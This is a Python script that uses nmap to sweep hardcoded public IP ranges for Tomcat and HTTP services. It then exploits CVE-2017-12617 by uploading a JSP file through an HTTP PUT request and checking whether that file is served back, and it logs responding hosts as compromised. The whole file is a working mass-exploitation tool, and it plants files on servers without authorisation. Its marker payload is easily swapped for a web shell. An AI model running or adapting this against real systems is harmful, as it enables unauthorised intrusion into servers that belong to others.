import threading

import nmap
import requests
from netaddr import *
import logging
from requests import ReadTimeout, ConnectTimeout, HTTPError, Timeout, ConnectionError
from requests.adapters import HTTPAdapter



def getTestData():
    return [('120.24.77.1',24),('180.76.168.1',24)]

def getIpList(prefix, range):
    ip_range = prefix + '/' + str(range)
    # to filter xxx.xxx.xxx.0 and xxx.xxx.xxx.255
    return list(IPNetwork(ip_range))

def singlePortScan(ip):
    ret = list()
    nm = nmap.PortScanner()
    nm.scan(hosts=ip, arguments='-sV')
    result = nm.csv()
    # Assuming there's just one http port 80/443 and -> or
    # if 'ajp' in result or 'http' in result:
    for line in result.strip().split('\r\n'):
        if not line.startswith("host;"):
            if line.split(';')[5].find('Apache Tomcat') or line.split(';')[5].find('http'):
                line_split = line.split(';')
                if line_split is not None and len(line_split) >= 13:
                    ret.append(ip)
                    ret.append(line_split[4])
    return ret

def getContent(url,f):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        s = requests.session()
        if url.startswith('https://'):
            s.mount('https://', HTTPAdapter(max_retries = 2))
        else:
            s.mount('http://', HTTPAdapter(max_retries = 2))
        requests.packages.urllib3.disable_warnings()
        re = s.get(str(url) + "/" + str(f), headers=headers, verify=False)
        return re.content
    except (ConnectTimeout, HTTPError, ReadTimeout, Timeout, ConnectionError) as e:
        logger.error('Requests lib exception raised {}'.format(e))


def createPayload(url,f):
    evil='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    requests.packages.urllib3.disable_warnings()
    try:
        req = requests.put(str(url)+str(f)+"/",data=evil, headers=headers,verify=False)
        if req.status_code == 201 or req.status_code == 200:
            logger.info('Poc file created!')
            return True
        else:
            logger.info('Poc file failed to create!')
            return False
    except (ConnectTimeout, HTTPError, ReadTimeout, Timeout, ConnectionError) as e:
        logger.error('Requests lib exception raised {}'.format(e))
        return False

def singlePocTest(url):
    checker = CHECK_FILE
    # logger.info("Poc Filename  {}".format(checker))
    pocCreatedFlag = createPayload(str(url) + "/", checker)
    flag = False
    if not pocCreatedFlag:
        return flag
    con = getContent(str(url) + "/", checker)
    if con == None:
        return flag
    if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
        logger.info('This url: ' + url + ' it\'s Vulnerable to CVE-2017-12617')
        flag = True
    logger.info('Check url is ' + url + "/" + checker)
    return flag

def urlAssembler(url_components):
    urls = list()
    for i in range(len(url_components)/2):
        url = ''
        if str(url_components[i*2+1]) == '443':
            url += 'https://'
        else:
            url += 'http://'
        url += (url_components[i*2] + ':' + url_components[i*2+1])
        logger.info("Will check this url: {}".format(url))
        urls.append(url)
    return urls


def scanAndCheck(ip):
    logger.info('Thread {} starts...'.format(threading.currentThread().getName()))
    url_components = singlePortScan(str(ip))
    if len(url_components) == 0:
        return
    urls = urlAssembler(url_components)
    for url in urls:
        try:
            ifVulnerable = singlePocTest(url)
            if ifVulnerable:
                logger.info('This {} is vulnerable!'.format(ip))
                ip_list.append(ip)
                logger.info('After Thread {} processing, The ip_list currently looks like: {}'
                            .format(threading.currentThread().getName(), ip_list))
        except (ConnectTimeout, HTTPError, ReadTimeout, Timeout, ConnectionError) as e:
            logger.error('Requests lib exception raised {}'.format(e))
            continue


def process():
    count = 0
    for ipRange in getTestData():
        ips = getIpList(ipRange[0], ipRange[1])
        for ip in ips:
            logger.info('Will processing {}'.format(ip))
            count = count + 1
            thread = threading.Thread(name='Thread' + str(count), target=scanAndCheck, args=(str(ip).strip(),))
            threads.append(thread)
            thread.start()
            while True:
                tc = len(threading.enumerate())
                if tc <= THREAD_TOTAL:
                    logger.info('Current active threads in total is less than {}. Will create new thread.'
                                .format(THREAD_TOTAL))
                    break

    # wait for all threads to end
    for thread in threads:
        thread.join(15000)

    logger.info('Here are the compromise ips: {}'.format(ip_list))
    return

if __name__ == '__main__':
    # constants
    # poc filename
    CHECK_FILE = 'pppooc.jsp'
    # max thread count
    THREAD_TOTAL = 30

    # universal shared variable
    ip_list = list()
    threads = []
    # current thread count
    threadCount = 0

    # logging config
    logger = logging.getLogger(__name__)
    # set up logging to file - see previous section for more details
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
                        datefmt='%m-%d %H:%M',
                        filename='./scanner.log',
                        filemode='w')
    # define a Handler which writes INFO messages or higher to the sys.stderr
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    # set a format which is simpler for console use
    formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')
    # tell the handler to use this format
    console.setFormatter(formatter)
    # add the handler to the root logger
    logging.getLogger('').addHandler(console)

    # working section
    process()